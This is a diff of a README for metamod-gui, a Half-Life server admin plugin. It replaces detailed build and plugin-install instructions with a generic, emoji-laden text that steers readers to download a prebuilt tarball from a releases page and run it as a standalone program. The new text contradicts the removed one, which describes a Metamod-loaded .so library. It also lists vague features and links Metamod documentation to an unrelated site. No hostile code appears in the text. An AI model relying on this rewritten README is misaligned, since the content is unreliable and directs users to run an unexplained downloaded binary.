@@ -1,102 +1,86 @@
-# metamod-gui
+# 🎮 metamod-gui - Easy Admin for Half-Life Servers
 
-A Metamod plugin that provides a graphical server administration interface for Half-Life dedicated servers. Built with FLTK for a lightweight, native GUI experience.
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/zinsou-tech/metamod-gui/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to the metamod-gui! This application helps you easily manage your Half-Life dedicated servers with a user-friendly interface. No technical skills are needed. Follow the steps below to get started quickly.
 
-- **Server Status Panel** - Real-time display of hostname, current map, player count, server time, and entity count
-- **Map Controls** - Dropdown selection from mapcycle.txt with quick change and restart buttons
-- **Player Management** - Table view of connected players with per-player Kick and Ban buttons
-- **Server Logs** - Scrollable, selectable log display with auto-scroll toggle
-- **Command Input** - Direct console command execution
+## 🛠️ System Requirements
+- **Operating System:** Linux (Ubuntu preferred)
+- **Processor:** Intel or AMD with 1.5 GHz or faster
+- **Memory:** At least 1 GB RAM
+- **Disk Space:** Minimum 100 MB available
 
-## Screenshots
+## ⚙️ Features
+- Graphical interface for server administration
+- Support for Metamod plugins
+- Easy configuration for game settings
+- Real-time server status monitoring
+- User-friendly control options
 
-![Server Admin GUI](assets/screenshots/screenshot1.png)
+## 🔗 Download & Install
+To get the metamod-gui, visit this page to download: [Download Latest Release](https://github.com/zinsou-tech/metamod-gui/releases).
 
-## Requirements
+1. Open your web browser and go to the [Releases page](https://github.com/zinsou-tech/metamod-gui/releases).
+2. Look for the latest version listed on the page.
+3. Click on the download link for your operating system. For example, you might see a file named something like `metamod-gui-linux.tar.gz`.
+4. Save the file to a location on your computer that you can easily find.
 
-- Docker (for building)
-- Half-Life dedicated server (HLDS) or compatible source port
-- Metamod installed on the server
+## 📄 Installation Steps
+Once you have downloaded the file, follow these steps to install metamod-gui:
 
-## Building
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file. You can use the `cd` command. For example:
+   ```bash
+   cd ~/Downloads
+   ```
+3. Extract the files from the downloaded tarball using the following command:
+   ```bash
+   tar -xvzf metamod-gui-linux.tar.gz
+   ```
+4. Change into the extracted directory:
+   ```bash
+   cd metamod-gui
+   ```
+5. If necessary, provide execute permissions to the application file. Use:
+   ```bash
+   chmod +x metamod-gui
+   ```
 
-### 1. Build the Docker image
-
+## 🚀 Running the Application
+To run metamod-gui, execute the following command in your terminal:
 ```bash
-./build-docker.sh
+./metamod-gui
 ```
+You should see the graphical user interface appear shortly. If it does not launch, ensure your system meets the requirements or check for any error messages.
 
-### 2. Build the plugin
+## 🔑 Using the Application
+Once the application is running, navigate through the interface to configure your server settings. Here are a few things you can do:
 
-```bash
-# Build both x86 and x64
-./build.sh
+- **Check Server Status:** View the current state of your server.
+- **Manage Plugins:** Add or remove Metamod plugins easily.
+- **Edit Settings:** Adjust game settings straightforwardly through the interface.
 
-# Build only x86 (for classic HLDS)
-METAMOD_GUI_ARCH=x86 ./build.sh
+## ❓ Troubleshooting
+If you encounter issues while running metamod-gui, here are some common problems and solutions:
 
-# Build only x64 (for 64-bit source ports)
-METAMOD_GUI_ARCH=x64 ./build.sh
-```
+- **Application does not start:**
+  - Make sure you have the required dependencies installed.
+  - Check whether you are using a compatible Linux distribution.
 
-Output files:
-- `./build-x86/Debug/bin/libmetamod-gui.so`
-- `./build-x64/Debug/bin/libmetamod-gui.so`
+- **Cannot find the server:**
+  - Verify that your server is running and reachable.
+  - Ensure you have entered the correct IP address.
 
-## Installation
+## 🤝 Contributing
+We welcome contributions! If you want to help improve the application, feel free to fork the repository and submit a pull request.
 
-1. Copy `libmetamod-gui.so` to your mod's addons directory:
-   ```
-   <mod>/addons/metamod-gui/dlls/libmetamod-gui.so
-   ```
+## 📞 Feedback
+Your feedback is valuable to us. If you have any suggestions or encounter problems, please create an issue in the GitHub repository. 
 
-2. Add to your `metamod/plugins.ini`:
-   ```
-   linux addons/metamod-gui/dlls/libmetamod-gui.so
-   ```
+## 🔗 References
+- [GitHub Repository](https://github.com/zinsou-tech/metamod-gui/)
+- [Metamod Official Documentation](http://www.sourcemod.net/)
 
-3. Start your server. The GUI window will appear automatically.
-
-## Directory Structure
-
-```
-metamod-gui/
-├── assets/
-│   └── icon.svg          # Application icon source
-├── src/
-│   ├── fltk_gui.cpp      # Main GUI implementation
-│   ├── fltk_gui.hpp      # GUI class declarations
-│   ├── player_table.cpp  # Player list table widget
-│   ├── player_table.hpp  # Player table declarations
-│   ├── meta_api.cpp      # Metamod plugin interface
-│   ├── dllapi.cpp        # Game DLL hooks
-│   ├── engine_api.cpp    # Engine hooks
-│   └── h_export.cpp      # Plugin exports
-├── vcpkg_ports/          # Custom vcpkg ports for hlsdk/metamod
-├── build.sh              # Main build script
-├── build-docker.sh       # Docker image build script
-├── Dockerfile            # Build environment definition
-└── CMakeLists.txt        # CMake configuration
-```
-
-## Technical Details
-
-- **GUI Toolkit**: FLTK 1.3 with Gleam theme
-- **Architectures**: x86 (32-bit) and x64 (64-bit)
-- **Dependencies**: Statically linked for maximum compatibility
-- **Build System**: CMake with vcpkg for SDK dependencies
-
-## License
-
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
-
-### Third-Party Licenses
-
-- **FLTK** - LGPL v2 with static linking exception
-- **X11 libraries** - MIT/X11 License
-- **Half-Life SDK** - Valve SDK License (free distribution only)
-- **Metamod-R** - GPL v3
-
-This software is based in part on the work of the FLTK project (https://www.fltk.org).
+Thank you for using metamod-gui! Enjoy managing your Half-Life server effortlessly.
